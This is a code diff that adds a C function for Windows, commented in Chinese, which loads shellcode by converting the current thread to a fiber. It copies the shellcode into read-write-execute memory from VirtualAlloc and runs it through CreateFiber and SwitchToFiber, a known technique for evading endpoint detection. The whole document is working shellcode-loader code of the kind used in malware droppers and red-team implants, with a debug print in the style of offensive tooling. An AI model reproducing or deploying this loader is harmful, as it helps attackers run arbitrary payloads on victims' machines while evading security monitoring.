@@ -1,0 +1,24 @@
+// 纤程加载方式：将线程转换为纤程并执行
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] 纤程加载方式执行Shellcode\n");
+#endif
+    LPVOID exec_mem = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!exec_mem) return;
+    memcpy(exec_mem, shellcode, shellcodeSize);
+    
+    // 转换线程为纤程
+    LPVOID mainFiber = IsThreadAFiber() ? GetCurrentFiber() : ConvertThreadToFiber(NULL);
+    if (!mainFiber) {
+        VirtualFree(exec_mem, 0, MEM_RELEASE);
+        return;
+    }
+    
+    // 创建并切换到执行纤程
+    LPVOID execFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)exec_mem, NULL);
+    if (execFiber) {
+        SwitchToFiber(execFiber);
+        DeleteFiber(execFiber);
+    }
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+}
